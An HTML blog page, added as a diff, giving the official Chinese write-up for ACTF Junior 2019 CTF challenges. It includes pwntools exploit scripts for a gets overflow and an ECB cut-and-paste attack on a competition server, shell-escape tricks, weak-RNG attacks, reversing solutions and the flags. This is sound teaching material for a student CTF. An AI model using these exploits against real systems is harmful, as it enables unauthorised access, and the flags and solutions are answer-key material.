@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+      <!-- Enable responsiveness on mobile devices-->
+      <!-- viewport-fit=cover is to support iPhone X rounded corners and notch in landscape-->
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=10, viewport-fit=cover">
+
+      <title>LuckyDog | CSUwangj&#x27;s Blog</title>
+
+      <!-- CSS -->
+      <link rel="stylesheet" href="https://CSUwangj.github.io/css/lib/font-awesome.min.css">
+      <link rel="stylesheet" href="https://CSUwangj.github.io/site.css">
+      <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Alegreya+Sans|Noto+Serif+SC">
+      
+<link rel="stylesheet" href="https://CSUwangj.github.io/custom.css">
+
+      <!-- js -->
+      <script type="text/javascript" charset="utf-8" src="https://CSUwangj.github.io/js/sidebar.js"></script>
+      
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css" crossorigin="anonymous">
+<script type="module">
+import renderMathInElement from "https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/auto-render.mjs";
+const katex_config = {
+  delimiters: [
+    { left: "$$", right: "$$", display: true },
+    { left: "$", right: "$", display: false },
+  ],
+  macros: {
+    // Functions
+    arccot: '\\operatorname{arccot}',
+    arcsec: '\\operatorname{arcsec}',
+    arccsc: '\\operatorname{arccsc}',
+  }
+}
+renderMathInElement(document.body, katex_config);
+</script>
+
+
+      
+
+      
+        <link rel="alternate" type="application/atom+xml" title="RSS" href="https://CSUwangj.github.io/atom.xml">
+      
+
+      
+      
+    </head>
+
+    <body>
+      
+      
+        <header name="header">
+          <div>
+            <div class="logo"><a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;">LuckyDog</a></div>
+            <nav class="menu">
+              
+                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;" class="nav-item-home unselectable">
+                  <span><i class="fa-solid fa-house"></i> Home</span>
+                </a>
+              
+                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;about" class="nav-item-about unselectable">
+                  <span><i class="fa-solid fa-user-circle"></i> About</span>
+                </a>
+              
+                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;categories" class="nav-item-categories unselectable">
+                  <span><i class="fa-solid fa-book"></i> Categories</span>
+                </a>
+              
+                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;tags" class="nav-item-tags unselectable">
+                  <span><i class="fa-solid fa-tags"></i> Tags</span>
+                </a>
+              
+                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;archives" class="nav-item-archives unselectable">
+                  <span><i class="fa-solid fa-inbox"></i> Archives</span>
+                </a>
+              
+                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;Webtools" class="nav-item-webtools unselectable">
+                  <span><i class="fa-solid fa-toolbox"></i> Webtools</span>
+                </a>
+              
+              
+            </nav>
+          </div>
+        </header>
+      
+
+      <main class="content container" name="main">
+        <div class="content-wrapper">
+          
+  <div class="post">
+    <h1 class="post-title">ACTF Junior 2019 Official WriteUP of CSUWangj&#x27;s Challenge</h1>
+    <div class="post-meta">
+      
+        <span class="post-meta-divider">|</span>
+        <span class="post-meta-item-icon"><i class="fa-solid fa-calendar"></i></span>
+        <span class="post-date">Posted on: </span>
+        <time datetime=2019-02-28T15:55:24+08:00 title="post created">2019-02-28</time>
+      
+      
+        <span class="post-meta-divider">|</span>
+        <span class="post-meta-item-icon"><i class="fa-solid fa-calendar-check"></i></span>
+        <span class="modify-date">Posted modified: </span>
+        <time datetime=2020-08-07T02:01:26.829857+08:00 title="post modified">2020-08-07</time>
+      
+      
+        <span class="post-meta-divider">|</span>
+        <span class="post-meta-item-icon"><i class="fa-solid fa-folder"></i></span>
+        <span class="in-category">In: </span>
+          
+            <a class="category" href="/category/WriteUp">WriteUp</a>
+          
+      
+      <span class="post-meta-divider">|</span>
+    </div>
+    <div class="post-body">
+      <p>日常出锅、、、</p>
+<span id="continue-reading"></span><h1 id="linux-pwn">Linux&amp;PWN</h1>
+<h2 id="vim">vim</h2>
+<p>首先要了解vim的几个模式</p>
+<p>然后vim在普通模式下是可以执行Linux命令的，然后就可以ls, cat flag之类的了。</p>
+<p>感谢各位没有把容器玩坏。</p>
+<h2 id="no-more-gets1">No_more_gets1</h2>
+<p>查看<a rel="noopener nofollow noreferrer" target="_blank" href="https://github.com/CSUwangj/ACTF_Junior_2019/blob/master/Linux%26PWN/No_more_gets2/src/src.c">源码</a>，问题出在<a rel="noopener nofollow noreferrer" target="_blank" href="https://github.com/CSUwangj/ACTF_Junior_2019/blob/master/Linux%26PWN/No_more_gets1/src/src.c#L140">第140行（rigist()+12）</a>，passwdbuf在namebuf前面，所以gets的时候可以把namebuf覆盖掉，于是就能强行注册一个密码自己设定的admin。</p>
+<p>一个可用的exp（来自给力的学弟）如下：</p>
+<pre data-lang="python" class="language-python "><code class="language-python" data-lang="python">from pwn import *
+import sys
+# context.log_level=&#x27;debug&#x27;
+
+if args[&#x27;REMOTE&#x27;]:
+    sh = remote(sys.argv[1], sys.argv[2])
+else:
+    sh = process(&quot;.&#x2F;a.out&quot;)
+
+payload=0x10 * &#x27;a&#x27; + p64(0x0) + p64(0x555555555607)
+
+sh.recvuntil(&quot;6) Exit&quot;)
+sh.sendline(&quot;3&quot;)
+#gdb.attach(sh)
+#gdb.attach(sh)
+sh.recvuntil(&quot;Input your name&quot;)
+sh.sendline(&#x27;father&#x27;)
+sh.recvuntil(&#x27;Input your password&#x27;)
+sh.sendline(&#x27;aaaaaaaaaaaaaaa\0admin\0&#x27;)
+sh.recvuntil(&quot;6) Exit&quot;)
+sh.sendline(&#x27;2&#x27;)
+sh.sendline(&#x27;admin&#x27;)
+sh.sendline(&#x27;aaaaaaaaaaaaaaa&#x27;)
+sh.sendline(&#x27;4&#x27;)
+print sh.recvuntil(&#x27;}&#x27;)
+sh.sendline(&#x27;6&#x27;)
+</code></pre>
+<h2 id="special-shell">Special_Shell</h2>
+<p>这个题是HGAME2018里看到的，感觉很有意思，YTB上有更详细的视频。</p>
+<p><a rel="noopener nofollow noreferrer" target="_blank" href="https://github.com/CSUAuroraLab/ACTF_Junior_2019/blob/master/Linux%26PWN/Special_Shell/src/src.c"><strong>源码</strong></a></p>
+<p>有两个预期解，一方面来说，假如去阅读system()的<a rel="noopener nofollow noreferrer" target="_blank" href="https://linux.die.net/man/3/system">手册</a>会看到</p>
+<blockquote>
+<p>Do not use <strong>system</strong>() from a program with set-user-ID or set-group-ID privileges, because strange values for some environment variables might be used to subvert system integrity. Use the <em><strong>exec</strong>(3)</em> family of functions instead, but not <em><strong>execlp</strong>(3)</em> or <em><strong>execvp</strong>(3)</em>.</p>
+</blockquote>
+<p>如果去找一些可能的实现可能可以看到下面这样的</p>
+<pre data-lang="c" class="language-c "><code class="language-c" data-lang="c">int system(const char *command)
+{
+    &#x2F;* balabala *&#x2F;
+        execl(&quot;&#x2F;bin&#x2F;sh&quot;, &quot;sh&quot;, &quot;-c&quot;, command, (char *) NULL);
+        _exit(127);                     &#x2F;* We could not exec the shell *&#x2F;
+
+    &#x2F;* balabala *&#x2F;
+    return status;
+}
+</code></pre>
+<p>所以用<code>$0</code>是可以getshell的。</p>
+<p>另一方面来说，<code>man bash</code>一下，了解一下<code>meta character in bash</code>，可以用<code>/???/?? .</code>得出目录，然后<code>/???/??? ????</code>看到flag。</p>
+<h2 id="no-more-gets2">No_more_gets2</h2>
+<p>查看<a rel="noopener nofollow noreferrer" target="_blank" href="https://github.com/CSUwangj/ACTF_Junior_2019/blob/master/Linux%26PWN/No_more_gets2/src/src.c">源码</a>，问题出在开始就莫名其妙的<a rel="noopener nofollow noreferrer" target="_blank" href="https://github.com/CSUwangj/ACTF_Junior_2019/blob/master/Linux%26PWN/No_more_gets2/src/src.c#L41">输入用户名</a>。</p>
+<p>只需要了解一下字节序、ascii码，这题就能解决了。</p>
+<h1 id="crypto">Crypto</h1>
+<h2 id="casear">casear</h2>
+<p>移位密码，加密时偏移量为+2，没有改变数字、大小写这几个属性</p>
+<p>至于你说那么多人把数字改成字母、、、</p>
+<p>算了，心累，这题提交失败超过20次的，线下逮到出题人请吃饭。。。</p>
+<h2 id="fan-shu">矾书</h2>
+<p>就是把字符画的主体换成了白色字体保存成PDF。</p>
+<p>大家还是很机灵的，顺便如果有个正好符合需求的PDF浏览器，这个题会解决得很快。</p>
+<p>{% asset_img test.png %}</p>
+<h2 id="fan-qie-ma">反切码</h2>
+<p>这里我偷了懒，并没有深入地考察这个东西、、、只需要百度就能找到出处，因为古音有八个读音，而现在只有四个，所以特地注明了一下用普通话来读。</p>
+<p>（其实当时想吃的是火锅，但是缺声母来着）</p>
+<h2 id="tiny-rsa">Tiny RSA</h2>
+<p>就是一个非常非常naive的RSA，简易到可以用手算，希望大家对将要到来的<strong>段老师</strong>教授的密码学有所期待，段老师真的超好！</p>
+<p>（貌似18级开始只有信安才有密码学，但是明明计算机相关的都应该学一点）</p>
+<h2 id="so-called-ecb">So called ECB</h2>
+<p>只要学到密码学的加密模式肯定会说到不要使用ECB的，而这里为了降低还特地把用户名、密码什么的分开加密再拼接，然而没有人做，感觉很不爽，不想给exp...</p>
+<pre data-lang="python" class="language-python "><code class="language-python" data-lang="python">from pwn import *
+# context.log_level=&#x27;debug&#x27;
+
+def regist(r, name, passwd):
+	print &quot;[*] Resitering Account&quot;
+	r.sendline(&#x27;1&#x27;)
+	r.sendline(name)
+	r.sendline(passwd)
+	r.recvuntil(&#x27;to {}&#x27;.format(name))
+	print &quot;[+] Succeed&quot;
+	return r.recv()[2:130]
+
+def transfer(r, name, passwd, to, amount):
+	print &quot;[*] Transferring&quot;
+	r.sendline(&#x27;2&#x27;)
+	r.sendline(name)
+	r.sendline(passwd)
+	r.sendline(to)
+	r.sendline(str(amount))
+	r.recvuntil(&#x27;to {}&#x27;.format(to))
+	print &quot;[+] Succeed&quot;
+	return r.recv()[2:130]
+	
+r = remote(&quot;47.107.33.15&quot;, 45338)
+name = &#x27;a&#x27;
+passwd = &#x27;a&#x27;
+admin = &#x27;admin&#x27;
+payload = regist(r, name, passwd)[:96]
+payload += transfer(r, name, passwd, admin, 1001)[96:128]
+print &quot;[*] Stealing money from admin&quot;
+for i in range(10):
+	r.sendline(&#x27;3&#x27;)
+	r.sendline(payload)
+print &quot;[+] Done&quot;
+print &quot;[*] Querying flag&quot;
+r.sendline(&#x27;5&#x27;)
+r.sendline(name)
+r.sendline(passwd)
+flag = r.recvuntil(&quot;}&quot;)
+index = -1
+try:
+	index = flag.index(&#x27;actf&#x27;)
+except:
+	index = flag.index(&#x27;ACTF&#x27;)
+flag = flag[index:]
+print &quot;[flag] {}&quot;.format(flag)
+</code></pre>
+<h2 id="broken-random">Broken Random</h2>
+<p>这题毕竟源码都给了，要点也都提示到了，其实没什么难度。</p>
+<p>直接的攻击点在于<a rel="noopener nofollow noreferrer" target="_blank" href="https://github.com/CSUwangj/ACTF_Junior_2019/blob/master/Crypto/Broken%20Random/src/src.c#L14">srand(time(NULL))</a></p>
+<p>srand()的效果是给rand()设置种子，问题就在于用<a rel="noopener nofollow noreferrer" target="_blank" href="https://linux.die.net/man/2/time">time(NULL)</a>。</p>
+<p>从文档里可以知道，time(NULL)返回从1970-01-01 00:00:00 +0000 (UTC)开始到现在的<strong>秒</strong>数。</p>
+<p>所以至少有以下几种攻击方式：</p>
+<ol>
+<li>同时开两个terminal，同时nc一下就很有可能让两个程序用同一个种子，只需要读一个写一个就行。</li>
+<li>把程序自己编译一遍，一边nc一边运行。</li>
+<li>暴力猜一下服务器的时间。（本地暴力）。</li>
+</ol>
+<h2 id="rsa-lab">RSA Lab</h2>
+<p>RSA相关的小问答，没什么难度。实际上这个才是tiny RSA，之前那个算是趣味小游戏的程度:D</p>
+<h2 id="happybirthday">HappyBirthday</h2>
+<p>生日攻击啊、、、</p>
+<p>听到有人说这个难度大，我已经把难度降低过了 ，原来的长度有56，60和64的、、、</p>
+<p>50位的话，碰撞一次的代价大概是$2^{25}$。</p>
+<hr />
+<p>好的，前面一顿分析全当放屁，愚蠢的出题人想当然认为[:50]是前50位而忘记了那是十六进制的问题。所以正常难度应该是把代码改成[:13]或者[:12]。。。</p>
+<p>EXP没什么好放的吧，就跑跑暴力的事情。</p>
+<h2 id="non-cryptography-hash">Non-cryptography Hash</h2>
+<p>这个题是看起来难的其实一点也不难的题，因为它的值域一共就、、、那么多、、、</p>
+<p>所以，不管是直接暴力，还是暴力建表然后查找，理论上都是可行的、、、</p>
+<h2 id="dian-ji-ying-xiong-1cun-dang-xiu-gai">点击英雄1存档修改</h2>
+<p>这个就不说了吧，也没有人问我，看起来都不想放弃游戏体验呢</p>
+<h1 id="forensics">Forensics</h1>
+<p>这部分题目我个人感觉解法是很多的，在我的认知里取证和渗透类似，不同的人不同的工具都会有不同的效果，而且可能都可以达成目的，这里的解答仅作参考，如果有什么特别的解法请<a href="mailto:CSUwangj@protonmail.com">告知我</a>，万分感激。</p>
+<p>顺便这几个题对flag的字符串都没有做什么隐藏，所以除了一个人以外都是strings/脱壳后strings解出来的，令出题人感到非常伤心，这根本不好玩嘛</p>
+<h2 id="popbox">Popbox</h2>
+<p>重定向输出流即可，cmd下可以直接&gt;，powershell需要用Out-File。</p>
+<h2 id="donothing">DoNothing</h2>
+<p>找程序，可以从启动项/任务管理器里找到一个不一样svchost.exe。</p>
+<p>接下来可以通过查看这个程序相关的活动找到输出文件，里面含有flag。</p>
+<p>也可以直接查看系统里所有的IO/网络/注册表等的操作情况来查找。这里推荐一下微软的工具箱SysinternalSuite里的procmon。</p>
+<h2 id="memory">Memory</h2>
+<p>flag放在程序的栈上面的，dump下来找一下就行了。</p>
+<p>也可以直接在内存里找。</p>
+<h2 id="wirefish">WireFish</h2>
+<p>WireShark抓一下就出来了</p>
+<hr />
+<p>这条分割线以下不是我出的，代发一下</p>
+<hr />
+<h1 id="reverse">Reverse</h1>
+<h2 id="show-me-the-code">show me the code</h2>
+<p>我们只看比较关键的给出的代码：</p>
+<pre data-lang="c" class="language-c "><code class="language-c" data-lang="c">for (int i = 1; keystr[i]; i++) {
+		keystr[i] ^= keystr[i-1];
+		keystr[i] += 2;
+	}
+...
+if(!strcmp(keystr,enstr)){
+    ...
+}
+else{
+    ...
+}
+</code></pre>
+<p>用户的输入在经过for循环的操作之后与enstr字符串比对，若相同则提示输入正确，所以我们要做的就是从给出的enstr字符串和for循环里的操作来__逆推__出正确的输入应该是怎样的。</p>
+<p>for循环里从第1位字符开始每个字符异或上一位的字符之后加2，加的逆操作是减，而异或的逆操作则是再次异或相同的数，比如说(a^b)^b = a ，所以我们的逆操作应该是从enstr最后一位字符开始，每一位先减2再异或前一位，循环至第1位，代码如下：</p>
+<pre data-lang="c" class="language-c "><code class="language-c" data-lang="c">## include&lt;stdio.h&gt;
+
+int main(){
+    char enstr[]={0x41,0x04,0x52,0x16,0x6f,0x3a,0x10,0x23,0x42,0x74,0x1b,0x31,0x70,0x49,0x7b,0x26,0x56,0x64,0x3d,0x4c,0x7e,0x0e,0x41,0x27,0x08,0x77};
+    for(int j=25;j&gt;=1;j--){
+		enstr[j] -= 2;
+		enstr[j] ^= enstr[j-1];
+	}
+	printf(&quot;%s&quot;,enstr);
+    return 0;
+}
+</code></pre>
+<p>得到flag：<strong>ACTF{W41c0m4_70_r4_w0r1d!}</strong></p>
+<h2 id="shi-wo-idala">食我ida啦</h2>
+<p>这一题主要是想做一个工具使用的引导，如题所说需要掌握ida的一个最基本的用法，即反编译二进制文件后找到主函数，按下F5查看c代码。</p>
+<p>在这一题里做到这一步就能直观地取得flag：<strong>ACTF{L15e_1da_d0_rEveR53}</strong></p>
+<p>（由于出题人图样，flag直接明文存放，可以直接放到二进制编辑器中搜索到flag的大部分。挨打×1）</p>
+<h2 id="simple-packer">simple packer</h2>
+<p>壳是程序本身为了达成防护或者减小体积的一种手段，根据目的不同分为加密壳和压缩壳。加了壳的程序无法直接进行逆向分析，一般的应对手段是脱壳。</p>
+<p>本题采用的壳是upx 2.03，属于压缩壳中比较常见的一种。对于这种壳不需要自己手动脱壳，借助<a rel="noopener nofollow noreferrer" target="_blank" href="https://pan.baidu.com/s/15P9RMXuitwS3CBl3PFVlig">工具</a>(提取码a8rs)可以完成脱壳的工作。本题主要的目的也是让入门的同学们认识到脱壳这一过程，脱完壳后使用ida进行分析可以直接拿到flag：</p>
+<p><strong>ACTF{L15e_1da_d0_rEveR53}</strong></p>
+<p>有关壳的其他相关知识感兴趣的同学可以接下来前往吾爱破解等安全相关论坛学习，里面有丰富的资料。</p>
+<p>（由于出题人再次图样，flag又直接明文存放，之前提到的操作可以搜索到完整的flag。绝赞挨打中qwq）</p>
+<h2 id="simple-asm">simple asm</h2>
+<p>根据给出的c代码我们可以知道这整个程序的流程很简单，要求输入flag后，把输入传入func函数，以func函数的返回值判断用户输入的是否为正确的flag，所以现在要做的就是分析func函数的功能从而解出flag。接下来开始一步步分析给出的func函数的汇编码：</p>
+<p>最开始的这一段分析需要掌握栈帧以及函数调用约定的相关知识，这里直接给出分析的结果：</p>
+<pre data-lang="assembly" class="language-assembly "><code class="language-assembly" data-lang="assembly">   0x0006fa &lt;+0&gt;:	push   rbp
+   0x0006fb &lt;+1&gt;:	mov    rbp,rsp
+   0x0006fe &lt;+4&gt;:	mov    QWORD PTR [rbp-0x18],rdi
+   0x000702 &lt;+8&gt;:	mov    DWORD PTR [rbp-0x4],0x0
+</code></pre>
+<p>在simple.c中我们知道有这样一个调用：<code>func(input)</code> ，而上面的汇编代码实现的是将参数<code>input</code>的地址保存到<code>[rbp-0x18]</code>这个地方。之后<code>[rbp-0x4]</code>则作为一个局部变量，为其赋值为<code>0x0</code>。到这里我们可以尝试还原一下c代码：</p>
+<pre data-lang="c" class="language-c "><code class="language-c" data-lang="c">int func(char *input){
+    int i=0x0;
+    ...
+}
+</code></pre>
+<p>我们将<code>[rbp-0x4]</code>假设为int型变量i，<code>[rbp-0x18]</code>假设为指向用户输入字符串首地址的指针input，往后看:</p>
+<pre data-lang="assembly" class="language-assembly "><code class="language-assembly" data-lang="assembly"> 0x000709 &lt;+15&gt;:	jmp    0x75d &lt;func+99&gt;
+ ...
+ 0x00075d &lt;+99&gt;:	cmp    DWORD PTR [rbp-0x4],0x15
+ 0x000761 &lt;+103&gt;:	jle    0x70b &lt;func+17&gt;
+</code></pre>
+<p>跳转到&lt;func+99&gt;后将<code>[rbp-0x4]</code>中的值（也就是i）与<code>0x15</code>比较，只要不大于<code>0x15</code>就会跳转到&lt;func+17&gt;处。因为i的初值为<code>0x0</code>，所以会实现跳转。</p>
+<pre data-lang="assembly" class="language-assembly "><code class="language-assembly" data-lang="assembly"> 0x00070b &lt;+17&gt;:	mov    eax,DWORD PTR [rbp-0x4]
+ 0x00070e &lt;+20&gt;:	movsxd rdx,eax
+ 0x000711 &lt;+23&gt;:	mov    rax,QWORD PTR [rbp-0x18]
+ 0x000715 &lt;+27&gt;:	add    rax,rdx
+ 0x000718 &lt;+30&gt;:	movzx  edx,BYTE PTR [rax]
+</code></pre>
+<p>根据先前的假设，前四行相当于完成了<code>(input+i)</code>,使input指向第i位字符；再看最后的<code>movzx  edx,BYTE PTR [rax]</code>,这里实现了寻址到<code>(input+i)</code>所表示的地址处并将此地址内存储的值传给edx，写成伪c代码相当于<code>edx = *(input + i)</code> 。</p>
+<pre data-lang="assembly" class="language-assembly "><code class="language-assembly" data-lang="assembly"> 0x00071b &lt;+33&gt;:	mov    eax,DWORD PTR [rbp-0x4]
+ 0x00071e &lt;+36&gt;:	movsxd rcx,eax
+ 0x000721 &lt;+39&gt;:	mov    rax,QWORD PTR [rbp-0x18]
+ 0x000725 &lt;+43&gt;:	add    rax,rcx
+ 0x000728 &lt;+46&gt;:	add    edx,0x7
+ 0x00072b &lt;+49&gt;:	mov    BYTE PTR [rax],dl
+</code></pre>
+<p>这里是比较关键的一个点，前四行进行的是与上一段相同的工作，到了第五行出现了使<code>edx</code>的值加7的操作，而在之前的分析中此时<code>edx</code>中存放的是<code>*(input+i)</code>，最后一行则是将加7之后的结果赋给原<code>(input+i)</code>的地址处。综上，上面的两段汇编实现了:  <code> *(input+i) += 7</code>，继续往下看：</p>
+<pre data-lang="assembly" class="language-assembly "><code class="language-assembly" data-lang="assembly">   0x00072d &lt;+51&gt;:	mov    eax,DWORD PTR [rbp-0x4]
+   0x000730 &lt;+54&gt;:	movsxd rdx,eax
+   0x000733 &lt;+57&gt;:	mov    rax,QWORD PTR [rbp-0x18]
+   0x000737 &lt;+61&gt;:	add    rax,rdx
+   0x00073a &lt;+64&gt;:	movzx  ecx,BYTE PTR [rax]
+   0x00073d &lt;+67&gt;:	mov    eax,DWORD PTR [rbp-0x4]
+   0x000740 &lt;+70&gt;:	movsxd rdx,eax
+   0x000743 &lt;+73&gt;:	lea    rax,[rip+0x2008f6]        ##  0x201040 &lt;enstr&gt;
+   0x00074a &lt;+80&gt;:	movzx  eax,BYTE PTR [rdx+rax*1]
+</code></pre>
+<p>前5行做的是一样的事，写成伪代码就是 <code>ecx = *(input + i)</code> ; 之后2行则为<code>rdx = i</code>; 最后2行比较关键，<code>lea    rax,[rip+0x2008f6]</code>所做的是将simple.c中给出的字符数组<code>enstr</code>的首地址存入<code>rax</code>，而后综合前面的分析可以得出伪代码<code> eax = *(enstr + i)</code>，之后是比较和跳转操作：</p>
+<pre data-lang="assembly" class="language-assembly "><code class="language-assembly" data-lang="assembly">   0x00074e &lt;+84&gt;:	cmp    cl,al
+   0x000750 &lt;+86&gt;:	je     0x759 &lt;func+95&gt;
+   0x000752 &lt;+88&gt;:	mov    eax,0x1
+   0x000757 &lt;+93&gt;:	jmp    0x768 &lt;func+110&gt;
+   0x000759 &lt;+95&gt;:	add    DWORD PTR [rbp-0x4],0x1
+   0x00075d &lt;+99&gt;:	cmp    DWORD PTR [rbp-0x4],0x15
+   0x000761 &lt;+103&gt;:	jle    0x70b &lt;func+17&gt;
+   0x000763 &lt;+105&gt;:	mov    eax,0x0
+   0x000768 &lt;+110&gt;:	pop    rbp
+   0x000769 &lt;+111&gt;:	ret
+</code></pre>
+<p>由之前的分析可以很容易看懂这里第一行的<code>cmp</code>操作:<code>*(input + i)</code>与<code>*(enstr + i)</code>比对（此时<code>*(input + i)</code>已经经过了加7的操作），相等则跳转到&lt;func+95&gt;继续执行，i的值加1，又进入&lt;func+99&gt;处的判断（可知这里应该是个while循环），直到i的值大于0x15后，给<code>eax</code>赋0，即此函数的返回值将为0，退回栈帧后返回；不相等则给<code>eax</code>赋1，即此函数的返回值将为1，跳转到&lt;func+110&gt;退回栈帧后返回。综合所有分析，完成c代码的还原:</p>
+<pre data-lang="c" class="language-c "><code class="language-c" data-lang="c">int func(unsigned char *input){
+	for(int i=0;i&lt;=21;i++){
+		input[i]+=7;
+		if(input[i]!=enstr[i]){
+			return 1;
+		}
+	}
+	return 0;
+}
+</code></pre>
+<p>我们只要将给出的<code>enstr</code>所有值减7，就能拿到flag：</p>
+<p>__ACTF{a5m_15_1mp0r7an7} __</p>
+<h2 id="guan-yu-wo-f5yi-hou-huan-shi-gao-bu-dong-ta-zai-xiang-xie-shi-yao-zhe-dang-shi">关于我F5以后还是搞不懂他在想些什么这档事</h2>
+<p>把文件放入ida分析，进入<code>main</code> 函数以后F5查看c代码。在接收用户输入以后有很长的一段代码：</p>
+<pre data-lang="c" class="language-c "><code class="language-c" data-lang="c">  v3 = malloc(0x82uLL);
+  v14 = v3;
+  v4 = qword_55FA3685F068;
+  *(_QWORD *)v3 = func_s;
+  *((_QWORD *)v3 + 1) = v4;
+  v5 = qword_55FA3685F078;
+  *((_QWORD *)v3 + 2) = qword_55FA3685F070;
+  *((_QWORD *)v3 + 3) = v5;
+  v6 = qword_55FA3685F088;
+  *((_QWORD *)v3 + 4) = qword_55FA3685F080;
+  *((_QWORD *)v3 + 5) = v6;
+  v7 = qword_55FA3685F098;
+  *((_QWORD *)v3 + 6) = qword_55FA3685F090;
+  *((_QWORD *)v3 + 7) = v7;
+  v8 = qword_55FA3685F0A8;
+  *((_QWORD *)v3 + 8) = qword_55FA3685F0A0;
+  *((_QWORD *)v3 + 9) = v8;
+  v9 = qword_55FA3685F0B8;
+  *((_QWORD *)v3 + 10) = qword_55FA3685F0B0;
+  *((_QWORD *)v3 + 11) = v9;
+  v10 = qword_55FA3685F0C8;
+  *((_QWORD *)v3 + 12) = qword_55FA3685F0C0;
+  *((_QWORD *)v3 + 13) = v10;
+  v11 = qword_55FA3685F0D8;
+  *((_QWORD *)v3 + 14) = qword_55FA3685F0D0;
+  *((_QWORD *)v3 + 15) = v11;
+  *((_WORD *)v3 + 64) = word_55FA3685F0E0;
+</code></pre>
+<p>这一段其实耐心看完不难发现，完成的其实只是将以<code>func_s</code>为首地址的之后130个字节的数据拷贝到以<code>v3</code>为首地址的空间里，相当于<code>memcpy((char *)v3,func_s,130);</code>。之后的内容则是将这段数据从<code>v3</code>开始，每个字节都异或<code>0x23</code>:</p>
+<pre data-lang="c" class="language-c "><code class="language-c" data-lang="c">  v17 = v14;
+  v16 = 0;
+  while ( v16 &lt;= 129 )
+  {
+    *v17 ^= 0x23u;
+    ++v16;
+    ++v17;
+  }
+</code></pre>
+<p>完成这一步后出现了一个不太寻常的操作：<code>((void (__fastcall *)(char *, char *))v14)(v13, v13);</code> 将这一段数据当作了函数并且传入参数<code>v13</code>调用了它。最后就到了验证flag的环节。flag当然不会原模原样的放在验证数组里（经过两次挨打的出题人终于不再图样了），所以我们还是要搞清楚这段数据被当作函数调用以后对用户的输入做了什么操作。</p>
+<p>问题来了，该怎么分析这段数据呢？一个比较省力的办法是使用ida的动态调试功能（因为是elf文件所以需要在linux的虚拟机里进行远程调试，具体的操作方法搜一蛤就能找到），在调用这段数据时下断点，程序自己运行到断点处时，单步进入，创建函数后再使用F5功能，就能看到这段数据被当作函数时是怎样的代码。经由上述操作，我们进入了获得了这段函数的代码：</p>
+<pre data-lang="c" class="language-c "><code class="language-c" data-lang="c">__int64 __fastcall sub_56389A4F1830(__int64 a1)
+{
+  int i; &#x2F;&#x2F; [rsp+14h] [rbp-4h]
+
+  for ( i = 0; *(_BYTE *)(i + a1); ++i )
+    *(_BYTE *)(i + a1) = (*(unsigned __int8 *)(i + a1) &lt;&lt; 32) &amp; ((signed int)*(unsigned __int8 *)(i + a1) &gt;&gt; 32) ^ 0xCC;
+  return 0LL;
+}
+</code></pre>
+<p>a1为用户输入，经历for循环中的移位、和、异或系列操作后返回。之后就是验证环节。运算操作没有很复杂，以下是解密代码：</p>
+<pre data-lang="c" class="language-c "><code class="language-c" data-lang="c">## include&lt;stdio.h&gt;
+
+int main() {
+	char str[]={0x8d,0x8f,0x98,0x8a,0xb7,0xbf,0xa3,0xa0,0xba,0xa9,0x93,0xbb,0xa5,0xb8,0xa4,0x93,0xa8,0xb5,0xa2,
+	0xad,0xa1,0xa5,0xaf,0x93,0xa8,0xa9,0xae,0xb9,0xab,0xab,0xa5,0xa2,0xab,0xb1};
+	for(int i=0;i&lt;=33;i++){
+		for(char input = 0x20;input&lt;=0x7e;input++){
+			char input_m;
+			input_m = ((input&lt;&lt;32)&amp;(input&gt;&gt;32)^0xcc);
+			if(input_m == str[i]){
+				printf(&quot;%c&quot;,input);
+				break;
+			}
+		}
+	}
+	return 0;
+  
+}
+</code></pre>
+<p>得到flag：<strong>ACTF{solve_with_dynamic_debugging}</strong></p>
+
+    </div>
+  </div>
+
+        </div>
+
+        
+          <button class="sidebar-toggle" onclick="openSidebar()">O</button>
+          <aside class="sidebar" name="sidebar">
+            <div class="site-author" itemprop="author" itemtype="https://schema.org/Person">
+              
+              <img class="site-author-image" itemprop="image"
+                src="https://CSUwangj.github.io/images/avatar.png"
+                alt="CSUwangj" />
+              
+              <p class="site-author-name unselectable">CSUwangj</p>
+              <p class="site-author-quote">Just keep in mind that hacking is very rarely in a sequence.</p>
+            </div>
+            <div class="feed-link">
+              
+                <a rel="alternate" type="application/atom+xml" title="RSS" href="https://CSUwangj.github.io/atom.xml">
+                  RSS
+                </a>
+              
+            </div>
+            <div class="links-of-author">
+              
+                <a href="https:&#x2F;&#x2F;github.com&#x2F;CSUwangj" title="Github" class="author-link">
+                  <i class="fa fw fa-github"></i>
+                </a>
+              
+                <a href="mailto:CSUwangj@protonmail.com" title="EMail" class="author-link">
+                  <i class="fa fw fa-envelope"></i>
+                </a>
+              
+            </div>
+            <div class="links-of-blogroll">
+              
+                <a href="https:&#x2F;&#x2F;wolfbolin.com&#x2F;">WolfBolin</a>
+              
+                <a href="https:&#x2F;&#x2F;haolovej.com&#x2F;">bocity</a>
+              
+                <a href="https:&#x2F;&#x2F;blog.yuki-nagato.com&#x2F;">长门有希</a>
+              
+                <a href="http:&#x2F;&#x2F;www.porlockz.com&#x2F;">Porlockz</a>
+              
+                <a href="https:&#x2F;&#x2F;way.lu&#x2F;">Phodphorus</a>
+              
+                <a href="https:&#x2F;&#x2F;zickshen.github.io&#x2F;">ZickShen</a>
+              
+            </div>
+          </aside>
+        
+
+      </main>
+
+      
+        <footer name="footer">
+          <div class="copyright">
+            <span item="copyrightYear">© 2018-2022</span>
+            <span class="author">CSUwangj</span>
+          </div>
+          <div class="powered-by">
+            Powered by <a href="https://www.getzola.org/">Zola</a> Theme <a href="https://github.com/CSUwangj/DogFood">DogFood</a>
+          </div>
+        </footer>
+      
+    </body>
+
+</html>
